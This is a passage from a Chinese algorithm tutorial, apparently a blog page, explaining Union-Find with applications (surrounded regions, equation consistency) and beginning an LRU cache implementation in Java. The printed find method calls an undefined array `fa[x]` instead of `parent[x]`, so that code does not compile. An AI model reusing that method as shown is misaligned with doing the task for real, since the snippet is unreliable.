class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 连通分量个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">    <span class="comment">// 存储一棵树</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] parent;</span><br><span class="line">    <span class="comment">// 记录树的“重量”</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] rank;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UF</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.count = n;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        rank = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            rank[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">        <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">        <span class="keyword">if</span> (rootP == rootQ)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 小树接到大树下面，较平衡</span></span><br><span class="line">        <span class="keyword">if</span> (rank[rootP] &lt;= rank[rootQ]) &#123;</span><br><span class="line">            parent[rootP] = rootQ;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootQ] = rootP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rank[rootP] == rank[rootQ] &amp;&amp; rootP != rootQ)</span><br><span class="line">            rank[rootQ]++;                   <span class="comment">//如果深度相同且根节点不同，则新的根节点的深度+1</span></span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">        <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">        <span class="keyword">return</span> rootP == rootQ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x == parent[x])</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            parent[x] = find(fa[x]);  <span class="comment">//父节点设为根节点</span></span><br><span class="line">            <span class="keyword">return</span> parent[x];         <span class="comment">//返回父节点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Union-Find 算法的复杂度可以这样分析：构造函数初始化数据结构需要 O(N) 的时间和空间复杂度；连通两个节点<code>union</code>、判断两个节点的连通性<code>connected</code>、计算连通分量<code>count</code>所需的时间复杂度均为 O(1)。</p><h2 id="1-2-并查集应用"><a href="#1-2-并查集应用" class="headerlink" title="1.2 并查集应用"></a>1.2 并查集应用</h2><h3 id="1-2-1-DFS-的替代方案"><a href="#1-2-1-DFS-的替代方案" class="headerlink" title="1.2.1 DFS 的替代方案"></a>1.2.1 DFS 的替代方案</h3><p>很多使用 DFS 深度优先算法解决的问题，也可以用 Union-Find 算法解决。</p><p>比如第 130 题，被围绕的区域：给你一个 M×N 的二维矩阵，其中包含字符 <code>X</code> 和 <code>O</code>，让你找到矩阵中<strong>四面</strong>被 <code>X</code> 围住的 <code>O</code>，并且把它们替换成 <code>X</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span></span>;</span><br></pre></td></tr></table></figure><p>注意哦，必须是四面被围的 <code>O</code> 才能被换成 <code>X</code>，也就是说边角上的 <code>O</code> 一定不会被围，进一步，与边角上的 <code>O</code> 相连的 <code>O</code> 也不会被 <code>X</code> 围四面，也不会被替换。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集应用2.jpg" alt="并查集应用2" style="zoom:50%;" /></p><p>​    PS：这让我想起小时候玩的棋类游戏「黑白棋」，只要你用两个棋子把对方的棋子夹在中间，对方的子就被替换成你的子。可见，占据四角的棋子是无敌的，与其相连的边棋子也是无敌的（无法被夹掉）。</p><p>​    解决这个问题的传统方法也不困难，先用 for 循环遍历棋盘的<strong>四边</strong>，用 DFS 算法把那些与边界相连的 <code>O</code> 换成一个特殊字符，比如 <code>#</code>；然后再遍历整个棋盘，把剩下的 <code>O</code> 换成 <code>X</code>，把 <code>#</code> 恢复成 <code>O</code>。这样就能完成题目的要求，时间复杂度 O(MN)。</p><p>​    这个问题也可以用 Union-Find 算法解决，虽然实现复杂一些，甚至效率也略低，但这是使用 Union-Find 算法的通用思想，值得一学。</p><p><strong>你可以把那些不需要被替换的 <code>O</code> 看成一个拥有独门绝技的门派，它们有一个共同祖师爷叫 <code>dummy</code>，这些 <code>O</code> 和 <code>dummy</code> 互相连通，而那些需要被替换的 <code>O</code> 与 <code>dummy</code> 不连通</strong>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集应用3.jpg" alt="并查集应用3" style="zoom:50%;" /></p><p>这就是 Union-Find 的核心思路，明白这个图，就很容易看懂代码了。</p><p>首先要解决的是，根据我们的实现，Union-Find 底层用的是一维数组，构造函数需要传入这个数组的大小，而题目给的是一个二维棋盘。</p><p>这个很简单，二维坐标 <code>(x,y)</code> 可以转换成 <code>x * n + y</code> 这个数（<code>m</code> 是棋盘的行数，<code>n</code> 是棋盘的列数）。敲黑板，<strong>这是将二维坐标映射到一维的常用技巧</strong>。</p><p>其次，我们之前描述的「祖师爷」是虚构的，需要给他老人家留个位置。索引 <code>[0.. m*n-1]</code> 都是棋盘内坐标的一维映射，那就让这个虚拟的 <code>dummy</code> 节点占据索引 <code>m * n</code> 好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (board.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m = board.length;</span><br><span class="line">    <span class="keyword">int</span> n = board[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// 给 dummy 留一个额外位置</span></span><br><span class="line">    UF uf = <span class="keyword">new</span> UF(m * n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> dummy = m * n;</span><br><span class="line">    <span class="comment">// 将首列和末列的 O 与 dummy 连通</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[i][<span class="number">0</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            uf.union(i * n, dummy);</span><br><span class="line">        <span class="keyword">if</span> (board[i][n - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            uf.union(i * n + n - <span class="number">1</span>, dummy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将首行和末行的 O 与 dummy 连通</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[<span class="number">0</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            uf.union(j, dummy);</span><br><span class="line">        <span class="keyword">if</span> (board[m - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            uf.union(n * (m - <span class="number">1</span>) + j, dummy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方向数组 d 是上下左右搜索的常用手法</span></span><br><span class="line">    <span class="keyword">int</span>[][] d = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;, &#123;<span class="number">0</span>,<span class="number">1</span>&#125;, &#123;<span class="number">0</span>,-<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m - <span class="number">1</span>; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n - <span class="number">1</span>; j++) </span><br><span class="line">            <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                <span class="comment">// 将此 O 与上下左右的 O 连通</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                    <span class="keyword">int</span> x = i + d[k][<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">int</span> y = j + d[k][<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (board[x][y] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                        uf.union(x * n + y, i * n + j);</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// 所有不和 dummy 连通的 O，都要被替换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m - <span class="number">1</span>; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n - <span class="number">1</span>; j++) </span><br><span class="line">            <span class="keyword">if</span> (!uf.connected(dummy, i * n + j))</span><br><span class="line">                board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很长，其实就是刚才的思路实现，只有和边界 <code>O</code> 相连的 <code>O</code> 才具有和 <code>dummy</code> 的连通性，他们不会被替换。</p><p>说实话，Union-Find 算法解决这个简单的问题有点杀鸡用牛刀，它可以解决更复杂，更具有技巧性的问题，<strong>主要思路是适时增加虚拟节点，想办法让元素「分门别类」，建立动态连通关系</strong>。</p><h3 id="1-2-2-判定合法等式"><a href="#1-2-2-判定合法等式" class="headerlink" title="1.2.2 判定合法等式"></a>1.2.2 判定合法等式</h3><p>这个问题用 Union-Find 算法就显得十分优美了。题目是这样：</p><p>给你一个数组 <code>equations</code>，装着若干字符串表示的算式。每个算式 <code>equations[i]</code> 长度都是 4，而且只有这两种情况：<code>a==b</code> 或者 <code>a!=b</code>，其中 <code>a,b</code> 可以是任意小写字母。你写一个算法，如果 <code>equations</code> 中所有算式都不会互相冲突，返回 true，否则返回 false。</p><p>比如说，输入 <code>[&quot;a==b&quot;,&quot;b!=c&quot;,&quot;c==a&quot;]</code>，算法返回 false，因为这三个算式不可能同时正确。</p><p>再比如，输入 <code>[&quot;c==c&quot;,&quot;b==d&quot;,&quot;x!=z&quot;]</code>，算法返回 true，因为这三个算式并不会造成逻辑冲突。</p><p>我们前文说过，动态连通性其实就是一种等价关系，具有「自反性」「传递性」和「对称性」，其实 <code>==</code> 关系也是一种等价关系，具有这些性质。所以这个问题用 Union-Find 算法就很自然。</p><p>核心思想是，<strong>将 <code>equations</code> 中的算式根据 <code>==</code> 和 <code>!=</code> 分成两部分，先处理 <code>==</code> 算式，使得他们通过相等关系各自勾结成门派；然后处理 <code>!=</code> 算式，检查不等关系是否破坏了相等关系的连通性</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">equationsPossible</span><span class="params">(String[] equations)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 26 个英文字母</span></span><br><span class="line">    UF uf = <span class="keyword">new</span> UF(<span class="number">26</span>);</span><br><span class="line">    <span class="comment">// 先让相等的字母形成连通分量</span></span><br><span class="line">    <span class="keyword">for</span> (String eq : equations) &#123;</span><br><span class="line">        <span class="keyword">if</span> (eq.charAt(<span class="number">1</span>) == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> x = eq.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">char</span> y = eq.charAt(<span class="number">3</span>);</span><br><span class="line">            uf.union(x - <span class="string">&#x27;a&#x27;</span>, y - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查不等关系是否打破相等关系的连通性</span></span><br><span class="line">    <span class="keyword">for</span> (String eq : equations) &#123;</span><br><span class="line">        <span class="keyword">if</span> (eq.charAt(<span class="number">1</span>) == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> x = eq.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">char</span> y = eq.charAt(<span class="number">3</span>);</span><br><span class="line">            <span class="comment">// 如果相等关系成立，就是逻辑冲突</span></span><br><span class="line">            <span class="keyword">if</span> (uf.connected(x - <span class="string">&#x27;a&#x27;</span>, y - <span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，这道判断算式合法性的问题就解决了，借助 Union-Find 算法，是不是很简单呢？</p><h3 id="1-2-3-简单总结"><a href="#1-2-3-简单总结" class="headerlink" title="1.2.3 简单总结"></a>1.2.3 简单总结</h3><p>使用 Union-Find 算法，主要是如何把原问题转化成图的动态连通性问题。对于算式合法性问题，可以直接利用等价关系，对于棋盘包围问题，则是利用一个虚拟节点，营造出动态连通特性。</p><p>另外，将二维数组映射到一维数组，利用方向数组 <code>d</code> 来简化代码量，都是在写算法时常用的一些小技巧，如果没见过可以注意一下。</p><h1 id="2-LRU算法"><a href="#2-LRU算法" class="headerlink" title="2. LRU算法"></a>2. LRU算法</h1><p>计算机的缓存容量有限，如果缓存满了就要删除一些内容，给新内容腾位置。但问题是，删除哪些内容呢？我们肯定希望删掉哪些没什么用的缓存，而把有用的数据继续留在缓存里，方便之后继续使用。那么，什么样的数据，我们判定为「有用的」的数据呢？</p><p>LRU 缓存淘汰算法就是一种常用策略。LRU 的全称是 Least Recently Used，也就是说我们认为最近使用过的数据应该是是「有用的」，很久都没用过的数据应该是无用的，内存满了就优先删那些很久没用过的数据。（操作系统内存管理的一种算法）</p><h2 id="2-1-LRU-算法描述"><a href="#2-1-LRU-算法描述" class="headerlink" title="2.1 LRU 算法描述"></a>2.1 LRU 算法描述</h2><p>力扣第 146 题「LRU缓存机制」就是让你设计数据结构：</p><p>首先要接收一个 <code>capacity</code> 参数作为缓存的最大容量，然后实现两个 API，一个是 <code>put(key, val)</code> 方法存入键值对，另一个是 <code>get(key)</code> 方法获取 <code>key</code> 对应的 <code>val</code>，如果 <code>key</code> 不存在则返回 -1。</p><p>注意哦，<code>get</code> 和 <code>put</code> 方法必须都是 <code>O(1)</code> 的时间复杂度，我们举个具体例子来看看 LRU 算法怎么工作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 缓存容量为 2 */</span></span><br><span class="line">LRUCache cache = <span class="keyword">new</span> LRUCache(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 你可以把 cache 理解成一个队列</span></span><br><span class="line"><span class="comment">// 假设左边是队头，右边是队尾</span></span><br><span class="line"><span class="comment">// 最近使用的排在队头，久未使用的排在队尾</span></span><br><span class="line"><span class="comment">// 圆括号表示键值对 (key, val)</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// cache = [(1, 1)]</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// cache = [(2, 2), (1, 1)]</span></span><br><span class="line"></span><br><span class="line">cache.get(<span class="number">1</span>);       <span class="comment">// 返回 1</span></span><br><span class="line"><span class="comment">// cache = [(1, 1), (2, 2)]</span></span><br><span class="line"><span class="comment">// 解释：因为最近访问了键 1，所以提前至队头</span></span><br><span class="line"><span class="comment">// 返回键 1 对应的值 1</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// cache = [(3, 3), (1, 1)]</span></span><br><span class="line"><span class="comment">// 解释：缓存容量已满，需要删除内容空出位置</span></span><br><span class="line"><span class="comment">// 优先删除久未使用的数据，也就是队尾的数据</span></span><br><span class="line"><span class="comment">// 然后把新的数据插入队头</span></span><br><span class="line"></span><br><span class="line">cache.get(<span class="number">2</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line"><span class="comment">// cache = [(3, 3), (1, 1)]</span></span><br><span class="line"><span class="comment">// 解释：cache 中不存在键为 2 的数据</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">1</span>, <span class="number">4</span>);    </span><br><span class="line"><span class="comment">// cache = [(1, 4), (3, 3)]</span></span><br><span class="line"><span class="comment">// 解释：键 1 已存在，把原始值 1 覆盖为 4</span></span><br><span class="line"><span class="comment">// 不要忘了也要将键值对提前到队头</span></span><br></pre></td></tr></table></figure><h2 id="2-2-LRU-算法设计"><a href="#2-2-LRU-算法设计" class="headerlink" title="2.2 LRU 算法设计"></a>2.2 LRU 算法设计</h2><p>分析上面的操作过程，要让 <code>put</code> 和 <code>get</code> 方法的时间复杂度为 O(1)，我们可以总结出 <code>cache</code> 这个数据结构必要的条件：</p><p>1、显然 <code>cache</code> 中的元素必须有时序，以区分最近使用的和久未使用的数据，当容量满了之后要删除最久未使用的那个元素腾位置。</p><p>2、我们要在 <code>cache</code> 中快速找某个 <code>key</code> 是否已存在并得到对应的 <code>val</code>；</p><p>3、每次访问 <code>cache</code> 中的某个 <code>key</code>，需要将这个元素变为最近使用的，也就是说 <code>cache</code> 要支持在任意位置快速插入和删除元素。</p><p>那么，什么数据结构同时符合上述条件呢？哈希表查找快，但是数据无固定顺序；链表有顺序之分，插入删除快，但是查找慢。所以结合一下，形成一种新的数据结构：哈希链表 <code>LinkedHashMap</code>。</p><p>LRU 缓存算法的核心数据结构就是哈希链表，双向链表和哈希表的结合体。这个数据结构长这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/LRU.jpg" alt="LRU" style="zoom:50%;" /></p><p>借助这个结构，我们来逐一分析上面的 3 个条件：</p><p>1、如果我们每次默认从链表尾部添加元素，那么显然越靠尾部的元素就是最近使用的，越靠头部的元素就是最久未使用的。</p><p>2、对于某一个 <code>key</code>，我们可以通过哈希表快速定位到链表中的节点，从而取得对应 <code>val</code>。</p><p>3、链表显然是支持在任意位置快速插入和删除的，改改指针就行。只不过传统的链表无法按照索引快速访问某一个位置的元素，而这里借助哈希表，可以通过 <code>key</code> 快速映射到任意一个链表节点，然后进行插入和删除。</p><p><strong>也许读者会问，为什么要是双向链表，单链表行不行？另外，既然哈希表中已经存了 <code>key</code>，为什么链表中还要存 <code>key</code> 和 <code>val</code> 呢，只存 <code>val</code> 不就行了</strong>？</p><p>想的时候都是问题，只有做的时候才有答案。这样设计的原因，必须等我们亲自实现 LRU 算法之后才能理解，所以我们开始看代码吧～</p><h2 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h2><p>很多编程语言都有内置的哈希链表或者类似 LRU 功能的库函数，但是为了帮大家理解算法的细节，我们先自己造轮子实现一遍 LRU 算法，然后再使用 Java 内置的 <code>LinkedHashMap</code> 来实现一遍。</p><p>首先，我们把双链表的节点类写出来，为了简化，<code>key</code> 和 <code>val</code> 都认为是 int 类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> key, val;</span><br><span class="line">    <span class="keyword">public</span> Node next, prev;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.key = k;</span><br><span class="line">        <span class="keyword">this</span>.val = v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后依靠我们的 <code>Node</code> 类型构建一个双链表，实现几个 LRU 算法必须的 API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleList</span> </span>&#123;  </span><br><span class="line">    <span class="comment">// 头尾虚节点</span></span><br><span class="line">    <span class="keyword">private</span> Node head, tail;  </span><br><span class="line">    <span class="comment">// 链表元素数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DoubleList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化双向链表的数据</span></span><br><span class="line">        head = <span class="keyword">new</span> Node(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> Node(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表尾部添加节点 x，时间 O(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(Node x)</span> </span>&#123;</span><br><span class="line">        x.prev = tail.prev;</span><br><span class="line">        x.next = tail;</span><br><span class="line">        tail.prev.next = x;</span><br><span class="line">        tail.prev = x;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除链表中的 x 节点（x 一定存在）</span></span><br><span class="line">    <span class="comment">// 由于是双链表且给的是目标 Node 节点，时间 O(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Node x)</span> </span>&#123;</span><br><span class="line">        x.prev.next = x.next;</span><br><span class="line">        x.next.prev = x.prev;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除链表中第一个节点，并返回该节点，时间 O(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Node <span class="title">removeFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head.next == tail)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        Node first = head.next;</span><br><span class="line">        remove(first);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表长度，时间 O(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里就能回答刚才「为什么必须要用双向链表」的问题了，因为我们需要<strong>删除</strong>操作。删除一个节点不光要得到该节点本身的指针，也需要操作其前驱节点的指针，而双向链表才能支持直接查找前驱，保证操作的时间复杂度 O(1)。</p><p><strong>注意我们实现的双链表 API 只能从尾部插入，也就是说靠尾部的数据是最近使用的，靠头部的数据是最久为使用的</strong>。</p><p>有了双向链表的实现，我们只需要在 LRU 算法中把它和哈希表结合起来即可，先搭出代码框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="comment">// key -&gt; Node(key, val)</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, Node&gt; map;</span><br><span class="line">    <span class="comment">// Node(k1, v1) &lt;-&gt; Node(k2, v2)...</span></span><br><span class="line">    <span class="keyword">private</span> DoubleList cache;</span><br><span class="line">    <span class="comment">// 最大容量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        cache = <span class="keyword">new</span> DoubleList();</span><br><span class="line">    